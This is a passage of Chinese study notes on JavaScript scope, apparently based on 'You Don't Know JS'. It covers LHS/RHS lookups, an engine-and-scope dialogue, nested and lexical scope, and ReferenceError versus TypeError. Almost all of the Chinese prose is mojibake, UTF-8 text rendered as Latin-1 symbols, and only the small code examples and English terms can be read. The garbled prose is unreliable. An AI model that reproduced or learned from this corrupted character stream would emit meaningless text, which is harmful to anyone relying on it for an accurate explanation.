ä¸ºå®žé™…ä¸Šæˆ‘ä»¬å¹¶ä¸å…³å¿ƒå½“å‰çš„å€¼æ˜¯ä»€ä¹ˆï¼Œåªæ˜¯æƒ³è¦ä¸º =2 è¿™ä¸ªèµ‹å€¼æ“ä½œæ‰¾åˆ°ä¸€ä¸ªç›®æ ‡ LHSä¸ŽRHSæœ€å¥½ç†è§£ä¸ºï¼Œèµ‹å€¼æ“ä½œçš„ç›®æ ‡æ˜¯è°ï¼ˆLHSï¼‰ä»¥åŠè°æ˜¯èµ‹å€¼æ“ä½œçš„æºå¤´ï¼ˆRHSï¼‰. 1234567// æ€è€ƒè¿™ä¸ªç¨‹åºfunction foo(a)&#123; console.log(a);&#125;foo(2);// è¿™é‡Œçš„ foo(...)å‡½æ•°çš„è°ƒç”¨éœ€è¦å¯¹ foo è¿›è¡Œ RHS å¼•ç”¨ï¼Œæ„å‘³ç€â€œåŽ»æ‰¾ foo çš„å€¼ï¼Œå¹¶æŠŠå®ƒç»™æˆ‘â€ï¼Œå¹¶ä¸”ï¼ˆ...ï¼‰æ„å‘³ç€ foo çš„å€¼éœ€è¦è¢«æ‰§è¡Œï¼Œå› ä¸ºå®ƒæœ€å¥½çœŸçš„æ˜¯ä¸€ä¸ªå‡½æ•°ç±»åž‹çš„å€¼ï¼è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéšå¼ a = 2.è¿™ä¸ªæ“ä½œå‘ç”Ÿåœ¨ 2 è¢«å½“åšå‚æ•°ä¼ ç»™foo(...)å‡½æ•°æ—¶ï¼Œ2ä¼šè¢«åˆ†é…ç»™å‚æ•° a,ä¸ºäº†ç»™å‚æ•°aï¼ˆéšå¼åœ°ï¼‰åˆ†é…å€¼ï¼Œéœ€è¦è¿›è¡Œä¸€æ¬¡ LHSæŸ¥è¯¢ã€‚è¿™é‡Œè¿˜æœ‰å¯¹ a è¿›è¡Œçš„ RHS çš„å¼•ç”¨ï¼Œå¹¶ä¸”å°†å¾—åˆ°çš„å€¼ä¼ ç»™äº† console.log(...)ã€‚console.log(...) æœ¬èº«ä¹Ÿéœ€è¦ä¸€ä¸ªåº”ç”¨æ‰èƒ½æ‰§è¡Œï¼Œå› æ­¤ä¼šå¯¹ console å¯¹è±¡è¿›è¡Œ RHS æŸ¥è¯¢ï¼Œå¹¶ä¸”æ£€æŸ¥å¾—åˆ°çš„å€¼ä¸­æ˜¯å¦æœ‰ä¸€ä¸ªå«åš log çš„æ–¹æ³•ã€‚// æœ€åŽåœ¨æ¦‚å¿µä¸Šå¯ä»¥ç†è§£ä¸ºåœ¨ LHS å’Œ RHS ä¹‹é—´é€šè¿‡å¯¹ å€¼2è¿›è¡Œäº¤äº’æ¥å°†å…¶ä¼ é€’ç»™ log (...)ï¼ˆé€šè¿‡å˜é‡açš„ RHS æŸ¥è¯¢ï¼‰ã€‚å‡è®¾åœ¨ log(...)å‡½æ•°çš„åŽŸç”Ÿå®žçŽ°ä¸­å®ƒå¯ä»¥æŽ¥å—å‚æ•°ï¼Œåœ¨å°†2èµ‹å€¼ç»™å…¶ä¸­ç¬¬ä¸€ä¸ªï¼ˆä¹Ÿè®¸å«åš arg1ï¼‰å‚æ•°ä¹‹å‰ï¼Œè¿™ä¸ªå‚æ•°éœ€è¦è¿›è¡Œ LHS å¼•ç”¨æŸ¥è¯¢ã€‚ å°†å‡½æ•°å£°æ˜Ž function foo(a){} è½¬ä¸ºæ™®é€šçš„å˜é‡å£°æ˜Žå’Œèµ‹å€¼ï¼Œæ¯”å¦‚ var foo ã€foo = function(a){}ï¼Œè¿™æ ·è¿™ä¸ªå‡½æ•°å£°æ˜Žå°†éœ€è¦è¿›è¡Œ LHS æŸ¥è¯¢ã€‚ ç„¶è€Œè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„è½»å¾®å·®åˆ«ï¼Œç¼–è¯‘å™¨å¯ä»¥åœ¨ä»£ç ç”Ÿæˆçš„åŒæ—¶å¤„ç†å£°æ˜Žå’Œå€¼çš„å®šä¹‰ï¼Œæ¯”å¦‚åœ¨å¼•æ“Žæ‰§è¡Œä»£ç æ—¶ï¼Œå¹¶ä¸ä¼šæœ‰çº¿ç¨‹ä¸“é—¨æ¥å°†ä¸€ä¸ªå‡½æ•°å€¼â€œåˆ†é…ç»™â€foo.å› æ­¤ï¼Œå°†å‡½æ•°å£°æ˜Žç†è§£æˆå‰é¢è®¨è®ºçš„ LHS æŸ¥è¯¢å’Œèµ‹å€¼çš„å½¢å¼å¹¶ä¸åˆé€‚ã€‚ å¼•æ“Žå’Œä½œç”¨åŸŸçš„å¯¹è¯1234function foo(a)&#123; console.log(a);&#125;foo(2); å¯¹è¯ï¼š 12345678910111213å¼•æ“Žï¼šä½œç”¨åŸŸï¼Œæˆ‘éœ€è¦ä¸ºfoo è¿›è¡Œ RHS å¼•ç”¨ï¼Œä½ æœ‰è§è¿‡å®ƒå—ï¼Ÿä½œç”¨åŸŸï¼šç¼–è¯‘å™¨åˆšåˆšå£°æ˜Žäº†å®ƒï¼Œå®ƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç»™ä½ ï¼å¼•æ“Žï¼šå¥½çš„ï¼Œæˆ‘æ¥æ‰§è¡Œä¸€ä¸‹ fooå¼•æ“Žï¼šä½œç”¨åŸŸï¼Œæˆ‘çŽ°åœ¨éœ€è¦ç»™ a è¿›è¡Œ LHS å¼•ç”¨ï¼Œè¿™ä¸ªä½ è§è¿‡å—ï¼Ÿä½œç”¨åŸŸï¼šè¿™ä¸ªä¹Ÿè§è¿‡ï¼Œç¼–è¯‘å™¨æœ€è¿‘æŠŠå®ƒå£°æ˜Žä¸º foo çš„ä¸€ä¸ªå½¢å¼å‚æ•°äº†ï¼Œæ‹¿åŽ»å§å¼•æ“Žï¼šé‚£æˆ‘çŽ°åœ¨æŠŠ2èµ‹å€¼ç»™ aå¼•æ“Žï¼šæˆ‘è¦ä¸º console è¿›è¡Œ RHS å¼•ç”¨ï¼Œä½ æœ‰è¿‡å®ƒå—ï¼Ÿä½œç”¨åŸŸï¼šæœ‰å‘€ï¼Œconsole æ˜¯å†…ç½®å¯¹è±¡ï¼Œç»™ä½ å¼•æ“Žï¼šæˆ‘çœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯æœ‰ logï¼ˆ...ï¼‰ï¼Œæ‰¾åˆ°äº†ï¼Œæ˜¯ä¸€ä¸ªå‡½æ•°ã€‚å¼•æ“Žï¼šä½œç”¨åŸŸï¼Œå¸®æˆ‘å†æ‰¾ä¸€ä¸‹ a çš„ RHS å¼•ç”¨ï¼Œè™½ç„¶æˆ‘è®°å¾—å®ƒï¼Œä½†æ˜¯æˆ‘è¦å†ç¡®è®¤ä¸€æ¬¡ä½œç”¨åŸŸï¼šå¥½çš„ï¼Œè¿™ä¸ªå˜é‡æ²¡æœ‰å˜åŠ¨è¿‡ï¼Œç»™ä½ å¼•æ“Žï¼šå¥½çš„ï¼Œé‚£æˆ‘æŠŠ a çš„å€¼ï¼Œä¹Ÿå°±æ˜¯2 ä¼ é€’ç»™ log(...)... å°æµ‹è¯•æ£€éªŒä¸€ä¸‹åˆ°ç›®å‰çš„ç†è§£ç¨‹åº¦ï¼ŒæŠŠè‡ªå·±å½“ä½œå¼•æ“Žï¼Œå’Œä½œç”¨åŸŸè¿›è¡Œä¸€æ¬¡â€œå¯¹è¯â€ 12345function foo(a)&#123; var b = a; return a + b;&#125;var c = foo(2); æ‰¾åˆ°å…¶ä¸­çš„æ‰€æœ‰ LHS æŸ¥è¯¢ï¼ˆ3å¤„ï¼‰ æ‰¾å‡ºå…¶ä¸­çš„æ‰€æœ‰ RHS æŸ¥è¯¢ï¼ˆ4å¤„ï¼‰ æˆ‘çš„ç†è§£ï¼š 123456789101112å¼•æ“Žï¼šä½œç”¨åŸŸï¼Œæˆ‘éœ€è¦ä¸ºcè¿›è¡Œ LHS å¼•ç”¨ï¼Œä½ æœ‰è§è¿‡å®ƒå—ï¼Ÿä½œç”¨åŸŸï¼šç¼–è¯‘å™¨æŠŠå®ƒèµ‹å€¼ä¸ºäº†ä¸€ä¸ª fooï¼ˆ2ï¼‰æ‰§è¡Œå‡½æ•°äº†ã€‚å¼•æ“Žï¼šå¥½çš„ï¼Œé‚£æˆ‘æ¥ä¸º foo(2) è¿›è¡Œ RHS å¼•ç”¨ï¼Œæ¥çœ‹çœ‹è¿™ä¸ªå€¼æ˜¯ä»€ä¹ˆï¼Ÿå¼•æ“Žï¼šä½œç”¨åŸŸï¼Œæˆ‘çŽ°åœ¨éœ€è¦ç»™ a è¿›è¡Œ LHS å¼•ç”¨ï¼Œä½ æœ‰è§è¿‡å®ƒå—ï¼Ÿä½œç”¨åŸŸï¼šè¿™ä¸ªä¹Ÿè§è¿‡ï¼Œç¼–è¯‘å™¨æœ€è¿‘æŠŠå®ƒå£°æ˜Žä¸º foo çš„ä¸€ä¸ªå½¢å¼å‚æ•°äº†ï¼Œæ‹¿åŽ»å§å¼•æ“Žï¼šé‚£æˆ‘çŽ°åœ¨æŠŠ 2 èµ‹å€¼ç»™ aå¼•æ“Žï¼šæˆ‘çŽ°åœ¨è¦ä¸º b æ¥è¿›è¡Œ LHS å¼•ç”¨ï¼Œè€Œ a çš„å€¼æ¥è‡ªäºŽ b,é‚£ä¹ˆæˆ‘åŒæ—¶ä¹Ÿè¦ç»™ a è¿›è¡Œ RHS å¼•ç”¨ï¼Œä½œç”¨åŸŸä½ æ¸…æ¥šå—ï¼Ÿä½œç”¨åŸŸï¼šå¥½çš„ï¼Œæ‰¾åˆ° a è¿™ä¸ªå˜é‡äº†ï¼Œç»™ä½ å¼•æ“Žï¼šå¥½çš„ï¼Œé‚£æˆ‘æŠŠ a çš„å€¼ä¹Ÿå°±æ˜¯2èµ‹å€¼ç»™ bã€‚å¼•æ“Žï¼šä½œç”¨åŸŸï¼Œå‡½æ•°è¦è¿”å›ž a + bï¼Œæˆ‘éœ€è¦ç»™ a å’Œ b è¿›è¡Œ RHS å¼•ç”¨ä½œç”¨åŸŸï¼šå¥½çš„ï¼Œè¿™ä¸¤ä¸ªå€¼ï¼Œéƒ½æ²¡æœ‰å˜åŒ–ï¼Œç»™ä½ å¼•æ“Žï¼šå¥½çš„ï¼Œé‚£æˆ‘å°† a å’Œ b çš„å€¼ç›¸åŠ åŽå‡½æ•°è¿”å›ž ä½œç”¨åŸŸåµŒå¥—ä½œç”¨åŸŸæ˜¯æ ¹æ®åç§°æŸ¥æ‰¾å˜é‡çš„ä¸€å¥—è§„åˆ™ï¼Œå®žé™…æƒ…å†µä¸­ï¼Œé€šå¸¸éœ€è¦åŒæ—¶ä¼°è®¡å‡ ä¸ªä½œç”¨åŸŸã€‚ å½“ä¸€ä¸ªå—æˆ–è€…å‡½æ•°åµŒå¥—åœ¨å¦ä¸€ä¸ªå—æˆ–è€…å‡½æ•°ä¸­æ—¶ï¼Œå°±å‘ç”Ÿäº†ä½œç”¨åŸŸçš„åµŒå¥—ã€‚å› æ­¤ï¼Œåœ¨å½“å‰ä½œç”¨åŸŸä¸­æ— æ³•æ‰¾åˆ°æŸä¸ªå˜é‡çš„æ—¶ï¼Œå¼•æ“Žå°±ä¼šåœ¨å¤–å±‚åµŒå¥—çš„ä½œç”¨åŸŸä¸­ç»§ç»­æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å˜é‡ï¼Œæˆ–æŠµè¾¾æœ€ä¸‹å±‚çš„ä½œç”¨åŸŸï¼ˆä¹Ÿå°±æ˜¯å…¨å±€ä½œç”¨åŸŸï¼‰ä¸ºæ­¢ã€‚ æ€è€ƒä»¥ä¸‹ä»£ç ï¼š 12345function foo(a)&#123; console.log(a + b);&#125;var b = 2;foo(2) //4 å¯¹ bè¿›è¡Œçš„ RHS å¼•ç”¨æ— æ³•åœ¨å‡½æ•° foo å†…éƒ¨å®Œæˆï¼Œä½†å¯ä»¥åœ¨ä¸Šä¸€çº§ä½œç”¨åŸŸå®Œæˆã€‚ å›žé¡¾ä¸€ä¸‹å¯¹è¯ï¼š 1234å¼•æ“Žï¼šfoo çš„ä½œç”¨åŸŸï¼Œä½ è§è¿‡ b å—ï¼Œæˆ‘éœ€è¦å¯¹å®ƒè¿›è¡Œ RHS å¼•ç”¨ä½œç”¨åŸŸï¼šæ²¡æœ‰å¼•æ“Žï¼šå…¨å±€ä½œç”¨åŸŸå¤§å“¥ï¼Œä½ æœ‰åŠ è¿‡ b å—ï¼Œæˆ‘éœ€è¦å¯¹b è¿›è¡Œ RHS å¼•ç”¨ã€‚ä½œç”¨åŸŸï¼šå½“ç„¶äº†ï¼Œç»™ä½  éåŽ†åµŒå¥—ä½œç”¨åŸŸé“¾çš„è§„åˆ™å¾ˆç®€å•ï¼šå¼•æ“Žä»Žå½“å‰çš„æ‰§è¡Œä½œç”¨åŸŸå¼€å§‹æŸ¥æ‰¾å˜é‡ï¼Œå¦‚æžœæ‰¾ä¸åˆ°ï¼Œå°±å‘ä¸Šä¸€çº§ç»§ç»­æŸ¥æ‰¾ã€‚å½“æŠµè¾¾æœ€å¤–å±‚çš„å…¨å±€ä½œç”¨åŸŸæ—¶ï¼Œæ— è®ºæ˜¯æ‰¾åˆ°è¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼ŒæŸ¥æ‰¾è¿‡ç¨‹éƒ½ä¼šåœæ­¢ã€‚ å¼‚å¸¸ä¸ºä»€ä¹ˆåŒºåˆ† LHS å’Œ RHS æ˜¯ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼Ÿ å› ä¸ºåœ¨å˜é‡è¿˜æ²¡æœ‰å£°æ˜Žï¼ˆä»»ä½•ä½œç”¨åŸŸä¸­éƒ½æ— æ³•æ‰¾åˆ°è¯¥å˜é‡ï¼‰çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ç§æŸ¥è¯¢çš„è¡Œä¸ºæ˜¯ä¸ä¸€æ ·çš„ã€‚ è€ƒè™‘ä¸‹é¢çš„ä»£ç ï¼š 12345function foo(a)&#123; console.log(a + b); b = a;&#125;foo(2); ç¬¬ä¸€æ¬¡å¯¹ b è¿›è¡Œ RHS æŸ¥è¯¢æ˜¯æ— æ³•æ‰¾åˆ°è¯¥å˜é‡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªâ€œæœªå£°æ˜Žâ€çš„å˜é‡ï¼Œå› ä¸ºåœ¨ä»»ä½•ç›¸å…³çš„ä½œç”¨åŸŸä¸­ä¹Ÿæ— æ³•æ‰¾åˆ°å®ƒã€‚ å¦‚æžœ RHS æŸ¥è¯¢åœ¨æ‰€æœ‰åµŒå¥—çš„ä½œç”¨åŸŸä¸­éå¯»ä¸åˆ°æ‰€éœ€çš„å˜é‡ï¼Œå¼•æ“Žå°±ä¼šæŠ›å‡º ReferenceError å¼‚å¸¸ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒReferenceError æ˜¯éžå¸¸é‡è¦çš„å¼‚å¸¸ç±»åž‹ã€‚ ç›¸è¾ƒä¹‹ä¸‹ï¼Œå½“å¼•æ“Žæ‰§è¡Œ LHS æŸ¥è¯¢çš„æ—¶å€™ï¼Œå¦‚æžœåœ¨é¡¶å±‚çš„ï¼ˆå…¨å±€ä½œç”¨åŸŸï¼‰ä¸­ä¹Ÿæ— æ³•æ‰¾åˆ°ç›®æ ‡å˜é‡ï¼Œå…¨å±€ä½œç”¨åŸŸä¸­å°±ä¼šåˆ›å»ºä¸€ä¸ªå…·æœ‰è¯¥åç§°çš„å˜é‡ï¼Œå¹¶å°†å…¶è¿”å›žç»™å¼•æ“Žï¼Œå‰ææ˜¯ç¨‹åºè¿è¡Œåœ¨éžä¸¥æ ¼æ¨¡å¼ä¸‹ã€‚åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼ŒLHS æŸ¥è¯¢å¤±è´¥ï¼Œå¹¶ä¸ä¼šåˆ›å»ºå¹¶è¿”å›žä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¼•æ“Žä¼šæŠ›å‡ºè·Ÿ RHS æŸ¥è¯¢ä¸€æ ·å¤±è´¥ç±»ä¼¼çš„ ReferenceError å¼‚å¸¸ã€‚ æŽ¥ä¸‹æ¥ï¼Œå¦‚æžœ RHS æŸ¥è¯¢åˆ°äº†ä¸€ä¸ªå˜é‡ï¼Œä½†æ˜¯å°è¯•å¯¹è¿™ä¸ªå˜é‡è¿›è¡Œä¸åˆç†çš„æ“ä½œï¼Œä¾‹å¦‚è¯•å›¾å¯¹ä¸€ä¸ªéžå‡½æ•°ç±»åž‹çš„å€¼è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œæˆ–è€…å¼•ç”¨ null æˆ–è€… undefined ç±»åž‹çš„å€¼ä¸­çš„å±žæ€§ï¼Œé‚£ä¹ˆå¼•æ“Žä¼šæŠ›å‡ºå¦å¤–ä¸€ç§ç±»åž‹çš„å¼‚å¸¸ï¼Œå«åš TypeErrorã€‚ ReferenceError åŒä½œç”¨åŸŸåˆ¤åˆ«å¤±è´¥ç›¸å…³ï¼Œè€Œ TypeError åˆ™ä»£è¡¨ä½œç”¨åŸŸåˆ¤åˆ«æˆåŠŸäº†ï¼Œä½†æ˜¯å¯¹ç»“æžœçš„æ“ä½œæ˜¯éžæ³•æˆ–è€…ä¸åˆç†çš„ã€‚ å°ç»“ä½œç”¨åŸŸæ˜¯ä¸€å¥—è§„åˆ™ï¼Œç”¨äºŽç¡®å®šä½•å¤„ä»¥åŠå¦‚ä½•æŸ¥æ‰¾å˜é‡ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚å¦‚æžœæŸ¥æ‰¾çš„ç›®çš„æ˜¯å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨ LHS æŸ¥è¯¢ï¼Œå¦‚æžœç›®çš„æ˜¯èŽ·å–å˜é‡çš„å€¼ï¼Œå°±ä¼šä½¿ç”¨ RHS æŸ¥è¯¢ã€‚èµ‹å€¼æ“ä½œç¬¦ä¼šå¯¼è‡´ LHS æŸ¥è¯¢ã€‚= æ“ä½œç¬¦æˆ–è°ƒåŠ¨å‡½æ•°æ—¶ä¼ å…¥å‚æ•°çš„æ“ä½œéƒ½ä¼šå¯¼è‡´å…³è”ä½œç”¨åŸŸçš„èµ‹å€¼æ“ä½œã€‚JavaScript å¼•æ“Žé¦–å…ˆä¼šåœ¨ä»£ç æ‰§è¡Œå‰å¯¹å…¶è¿›è¡Œç¼–è¯‘ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œåƒ var a = 2è¿™æ ·çš„å£°æ˜Žä¼šè¢«åˆ†è§£åŽæ‰èƒ½ä¸¤ä¸ªç‹¬ç«‹çš„æ­¥éª¤ï¼š é¦–å…ˆï¼Œ var a åœ¨å…¶ä½œç”¨åŸŸä¸­å£°æ˜Žæ–°å˜é‡ï¼Œè¿™ä¼šåœ¨æœ€å¼€å§‹çš„é˜¶æ®µï¼Œä¹Ÿå°±æ˜¯ä»£ç æ‰§è¡Œå‰è¿›è¡Œ æŽ¥ä¸‹æ¥ï¼Œa = 2 ä¼šæŸ¥è¯¢ï¼ˆLHS æŸ¥è¯¢ï¼‰å˜é‡ a å¹¶å¯¹å…¶è¿›è¡Œèµ‹å€¼ LHS å’Œ RHS æŸ¥è¯¢éƒ½ä¼šåœ¨å½“å‰æ‰§è¡Œä½œç”¨åŸŸä¸­å¼€å§‹ï¼Œå¦‚æžœæœ‰éœ€è¦ï¼ˆä¹Ÿå°±æ˜¯è¯´å®ƒä»¬æ²¡æœ‰å‘¨åˆ°æ‰€éœ€çš„æ ‡è¯†ç¬¦ï¼‰ï¼Œå°±ä¼šå‘ä¸Šçº§ä½œç”¨åŸŸç»§ç»­æŸ¥æ‰¾ç›®æ ‡æ ‡è¯†ç¬¦ï¼Œè¿™æ ·æ¯æ¬¡ä¸Šå‡ä¸€çº§ä½œç”¨åŸŸï¼ˆä¸€å±‚æ¥¼ï¼‰ï¼Œæœ€åŽæŠµè¾¾å…¨å±€ä½œç”¨åŸŸï¼ˆé¡¶å±‚ï¼‰ï¼Œæ— è®ºæ‰¾åˆ°æ´»æ²¡æœ‰æ‰¾åˆ°éƒ½å°†åœæ­¢ã€‚ ä¸æˆåŠŸçš„ RHS å¼•ç”¨ä¼šå¯¼è‡´æŠ›å‡º RefenceError å¼‚å¸¸ã€‚ä¸æˆåŠŸçš„ LHS å¼•ç”¨ä¼šå¯¼è‡´è‡ªåŠ¨éšå¼åœ°åˆ›å»ºä¸€ä¸ªå…¨å±€å˜é‡ï¼ˆéžä¸¥æ ¼æ¨¡å¼ä¸‹ï¼‰ï¼Œè¯¥å˜é‡ä½¿ç”¨ LHS å¼•ç”¨çš„ç›®æ ‡ä½œä¸ºæ ‡è¯†ç¬¦ï¼Œæˆ–è€…æŠ›å‡º ReferenceError å¼‚å¸¸ï¼ˆä¸¥æ ¼æ¨¡å¼ä¸‹ï¼‰ è¯æ³•ä½œç”¨åŸŸæˆ‘ä»¬å°†â€œä½œç”¨åŸŸâ€å®šä¹‰ä¸ºä¸€å¥—è§„åˆ™ï¼Œè¿™å¥—è§„åˆ™ç”¨æ¥ç®¡ç†å¼•æ“Žå¦‚ä½•åœ¨å½“å‰ä½œç”¨åŸŸå·²ç»åµŒå¥—çš„å­ä½œç”¨åŸŸä¸­æ ¹æ®æ ‡è¯†ç¬¦åç§°è¿›è¡Œå˜é‡æŸ¥æ‰¾ã€‚ ä½œç”¨åŸŸå…±æœ‰ä¸¤ç§ä¸»è¦çš„å·¥ä½œæ¨¡åž‹ã€‚ç¬¬ä¸€ç§æ˜¯æœ€ä¸ºæ™®éçš„ï¼Œè¢«å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€æ‰€é‡‡ç”¨çš„è¯æ³•ä½œç”¨åŸŸï¼Œå¦å¤–ä¸€ç§å«åšåŠ¨æ€ä½œç”¨åŸŸï¼Œä»æœ‰ä¸€äº›ç¼–ç¨‹è¯­è¨€åœ¨ä½¿ç”¨ï¼ˆä¾‹å¦‚bash,perl ä¸­çš„ä¸€äº›æ¨¡å¼ï¼‰ã€‚ è¯æ³•é˜¶æ®µç¬¬ä¸€ç« è®²è¿‡ï¼Œå¤§éƒ¨åˆ†æ ‡å‡†è¯­è¨€ç¼–è¯‘å™¨çš„ç¬¬ä¸€ä¸ªå·¥ä½œé˜¶æ®µå«åšè¯æ³•åŒ–ï¼ˆä¹Ÿå«å•è¯åŒ–ï¼‰ã€‚å›žå¿†ä¸€ä¸‹ï¼Œè¯æ³•åŒ–çš„è¿‡ç¨‹ä¼šå¯¹æºä»£ç ä¸­çš„å­—ç¬¦è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æžœæ˜¯æœ‰çŠ¶æ€çš„è§£æžè¿‡ç¨‹ï¼Œè¿˜ä¼šèµ‹äºˆå•è¯è¯­ä¹‰ã€‚è¿™ä¸ªæ¦‚å¿µæ˜¯ç†è§£è¯æ³•ä½œç”¨åŸŸåŠå…¶åç§°æ¥åŽ†çš„åŸºç¡€ã€‚ç®€å•åœ°è¯´ï¼Œè¯æ³•ä½œç”¨åŸŸå°±æ˜¯å®šä¹‰åœ¨è¯æ³•é˜¶æ®µçš„ä½œç”¨åŸŸï¼Œè¯æ³•ä½œç”¨åŸŸæ˜¯ç”±ä½ åœ¨å†™ä»£ç æ—¶å°†å˜é‡å’Œå—ä½œç”¨åŸŸå†™åœ¨å“ªé‡Œæ¥å†³å®šçš„ï¼Œå› æ­¤å½“è¯æ³•åˆ†æžå™¨å¤„ç†ä»£ç æ—¶ä¼šä¿æŒä½œç”¨åŸŸä¸å˜ï¼ˆå¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯è¿™æ ·çš„ï¼‰ åŽé¢æœ‰ä¸€ç§æ¬ºéª—è¯æ³•ä½œç”¨åŸŸçš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•åœ¨è¯æ³•åˆ†æžå™¨å¤„ç†è¿‡åŽä¾ç„¶å¯ä»¥ä¿®æ”¹ä½œç”¨åŸŸï¼Œä½†æ˜¯è¿™ç§æœºåˆ¶å¯èƒ½ä¼šéš¾ä»¥ç†è§£ã€‚äº‹å®žä¸Šï¼Œè®©è¯æ³•ä½œç”¨åŸŸæ ¹æ®è¯æ³•å…³ç³»ä¹¦å†™æ—¶çš„è‡ªç„¶å…³ç³»ä¸å˜ï¼Œæ˜¯ä¸€ä¸ªéžå¸¸å¥½çš„æœ€ä½³å®žè·µ æ€è€ƒä¸€ä¸‹ä»£ç ï¼š 12345678function foo(a)&#123; var b = a * 2; function bar(c)&#123; console.log(a, b, c); &#125; bar(b*3)&#125;foo(2); // 2, 4, 12 åœ¨ä¸Šé¢ä¸­ä¾‹å­ä¸­æœ‰ä¸‰ä¸ªé€çº§åµŒå¥—çš„ä½œç”¨åŸŸ åŒ…å«æ•´ä¸ªå…¨å±€ä½œç”¨åŸŸï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼šfoo åŒ…å« foo æ‰€åˆ›å»ºçš„ä½œç”¨åŸŸï¼šaã€bã€bar åŒ…å« bar æ‰€åˆ›å»ºçš„ä½œç”¨åŸŸï¼šc è¿™é‡Œçš„ä½œç”¨åŸŸæ˜¯ä¸¥æ ¼åŒ…å«çš„ï¼Œæ²¡æœ‰ä»»ä½•å‡½æ•°çš„ä½œç”¨åŸŸå¯ä»¥ï¼ˆéƒ¨åˆ†ï¼‰åŒæ—¶å‡ºçŽ°åœ¨ä¸¤ä¸ªå¤–éƒ¨ä½œç”¨åŸŸä¸­ï¼Œå°±å¦‚åŒæ²¡æœ‰ä»»ä½•å‡½æ•°å¯ä»¥éƒ¨åˆ†å‡ºçŽ°åœ¨ä¸¤ä¸ªçˆ¶çº§å‡½æ•°ä¸­ä¸€æ ·ã€‚ æŸ¥æ‰¾ä½œç”¨åŸŸçš„ç»“æž„å’Œäº’ç›¸ä¹‹é—´çš„ä½ç½®å…³ç³»ç»™å¼•æ“Žæä¾›äº†è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œå¼•æ“Žç”¨è¿™äº›ä¿¡æ¯æ¥æŸ¥æ‰¾æ ‡è¯†ç¬¦çš„ä½ç½®ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¼•æ“Žæ‰§è¡Œ console.log(â€¦) å£°æ˜Žï¼Œå¹¶æŸ¥æ‰¾äº†aã€bå’Œcä¸‰ä¸ªå˜é‡çš„å¼•ç”¨ã€‚å®ƒé¦–å…ˆä»Žæœ€å†…éƒ¨çš„ä½œç”¨åŸŸå¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ bar(â€¦)å‡½æ•°çš„ä½œç”¨åŸŸå¼€å§‹æŸ¥æ‰¾ï¼Œå¼•æ“Žæ— æ³•å†è¿™é‡Œæ‰¾åˆ° a,å› ä¸ºä¼šåŽ»ä¸Šä¸€å±‚ åˆ°æ‰€åµŒå¥—çš„ foo(â€¦)çš„ä½œç”¨åŸŸä¸­ç»§ç»­æŸ¥æ‰¾ã€‚åœ¨è¿™é‡Œæ‰¾åˆ°äº† aï¼Œå› ä¸ºå¼•æ“Žä½¿ç”¨äº†è¿™ä¸ªå¼•ç”¨ï¼Œå¯¹ b æ¥è¯´ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚å¯¹ c æ¥è¯´ï¼Œå¼•æ“Žåœ¨ bar(â€¦)ä¸­å°±æ‰¾åˆ°äº†ã€‚ å¦‚æžœbar(â€¦)å’Œ foo(â€¦)çš„å†…éƒ¨éƒ½å­˜åœ¨ä¸€ä¸ª c,console.log(â€¦)å°±å¯ä»¥ç›´æŽ¥ä½¿ç”¨bar(â€¦)ä¸­çš„å˜é‡ï¼Œè€Œæ— éœ€åˆ°å¤–é¢çš„foo(â€¦)æŸ¥æ‰¾ã€‚ ä½œç”¨åŸŸæŸ¥æ‰¾ä¼šåœ¨æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ ‡è¯†ç¬¦æ—¶åœæ­¢ã€‚åœ¨å¤šå±‚çš„åµŒå¥—ä½œç”¨åŸŸä¸­å¯ä»¥å®šä¹‰åŒåçš„æ ‡è¯†ç¬¦ï¼Œå«åšâ€œé®è”½æ•ˆåº”â€ï¼ˆå†…éƒ¨çš„æ ‡è¯†ç¬¦â€œé®è”½â€äº†å¤–éƒ¨çš„æ ‡è¯†ç¬¦ï¼‰ã€‚æŠ›å¼€é®è”½æ•ˆåº”ï¼Œä½œç”¨åŸŸæŸ¥æ‰¾å§‹ç»ˆä»Žè¿è¡Œæ—¶æ‰€å¤„çš„æœ€å†…éƒ¨ä½œç”¨åŸŸå¼€å§‹ï¼Œé€çº§å‘å¤–æˆ–è€…è¯´å‘ä¸Šè¿›è¡Œï¼ŒçŸ¥é“é‡åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ ‡è¯†ç¬¦ä¸ºæ­¢ã€‚ å…¨å±€å˜é‡ä¼šè‡ªåŠ¨æˆä¸ºå…¨å±€å¯¹è±¡ï¼ˆæ¯”å¦‚æµè§ˆå™¨ä¸­çš„ windowå¯¹è±¡ï¼‰çš„å±žæ€§ï¼Œå› 